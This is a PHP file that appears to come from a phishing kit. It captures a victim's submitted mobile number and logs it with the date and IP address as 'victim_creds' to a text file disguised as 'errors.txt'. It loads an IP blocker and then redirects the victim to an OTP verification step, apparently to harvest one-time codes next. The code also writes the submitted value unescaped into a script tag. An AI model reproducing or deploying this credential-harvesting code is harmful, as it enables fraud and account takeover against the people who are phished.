<?php
include 'AddResult.php';
include 'ip_blocker.php';
if(isset($_POST['MNUMBER'])) {

     $victim_creds = "<span style='color:gray;'>{$date} {$IP}</span>  <span style='color:yellow;'>MOBILE NUMBER</span> > [<span style='color:green;'>{$_POST['MNUMBER']}</span>]<br>";
          AddResult('errors.txt', $victim_creds);


     $m = $_POST['MNUMBER'];
	echo "<script>";
	echo "window.location.assign('otpverification.php?auth=$m&secure=dW5hbWU=&id=bWFuZ21ra2Vwd2VuZ0B5YWhvby5jb20=');";
	echo "</script>";

}
?>
